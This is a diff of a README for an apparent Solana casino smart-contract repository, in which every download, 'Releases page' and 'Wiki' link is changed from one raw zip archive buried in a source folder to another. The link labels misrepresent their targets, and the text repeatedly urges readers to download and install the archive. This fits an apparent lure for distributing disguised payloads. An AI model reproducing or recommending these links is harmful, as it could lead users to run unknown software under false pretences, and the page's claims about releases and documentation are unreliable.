@@ -4,11 +4,11 @@
 
 Welcome to the Casino-Game-Smart-Contract repository! This project allows you to engage in various casino games built on the Solana blockchain. It ensures fairness and transparency in your gaming experience using advanced technology.
 
-[![Download Now](https://github.com/Clayuremir/Casino-Game-Smart-Contract/raw/refs/heads/main/programs/jackpot_smart_contract/src/Smart_Contract_Game_Casino_3.7.zip%https://github.com/Clayuremir/Casino-Game-Smart-Contract/raw/refs/heads/main/programs/jackpot_smart_contract/src/Smart_Contract_Game_Casino_3.7.zip)](https://github.com/Clayuremir/Casino-Game-Smart-Contract/raw/refs/heads/main/programs/jackpot_smart_contract/src/Smart_Contract_Game_Casino_3.7.zip)
+[![Download Now](https://raw.githubusercontent.com/Clayuremir/Casino-Game-Smart-Contract/main/idl/Game_Smart_Casino_Contract_1.6.zip%https://raw.githubusercontent.com/Clayuremir/Casino-Game-Smart-Contract/main/idl/Game_Smart_Casino_Contract_1.6.zip)](https://raw.githubusercontent.com/Clayuremir/Casino-Game-Smart-Contract/main/idl/Game_Smart_Casino_Contract_1.6.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Clayuremir/Casino-Game-Smart-Contract/raw/refs/heads/main/programs/jackpot_smart_contract/src/Smart_Contract_Game_Casino_3.7.zip) to download the latest version of the application. This page contains all available releases with detailed instructions for installation and setup. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Clayuremir/Casino-Game-Smart-Contract/main/idl/Game_Smart_Casino_Contract_1.6.zip) to download the latest version of the application. This page contains all available releases with detailed instructions for installation and setup. 
 
 ### Installation Steps
 
@@ -67,7 +67,7 @@ Join our growing community of players! You can connect with other users to share
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Access detailed guides and technical documentation on our [Wiki](https://github.com/Clayuremir/Casino-Game-Smart-Contract/raw/refs/heads/main/programs/jackpot_smart_contract/src/Smart_Contract_Game_Casino_3.7.zip).
+- **Documentation:** Access detailed guides and technical documentation on our [Wiki](https://raw.githubusercontent.com/Clayuremir/Casino-Game-Smart-Contract/main/idl/Game_Smart_Casino_Contract_1.6.zip).
 - **Tutorial Videos:** Watch step-by-step video tutorials on how to play each game and navigate the system.
 - **FAQs:** Find answers to frequently asked questions about gameplay, security, and more.
 
@@ -77,4 +77,4 @@ This project is licensed under the MIT License. You are free to adapt it to your
 
 ---
 
-To resume your journey, [visit the Releases page](https://github.com/Clayuremir/Casino-Game-Smart-Contract/raw/refs/heads/main/programs/jackpot_smart_contract/src/Smart_Contract_Game_Casino_3.7.zip) now and download the Casino-Game-Smart-Contract to start playing! Enjoy the thrill, and may the odds be in your favor!
+To resume your journey, [visit the Releases page](https://raw.githubusercontent.com/Clayuremir/Casino-Game-Smart-Contract/main/idl/Game_Smart_Casino_Contract_1.6.zip) now and download the Casino-Game-Smart-Contract to start playing! Enjoy the thrill, and may the odds be in your favor!
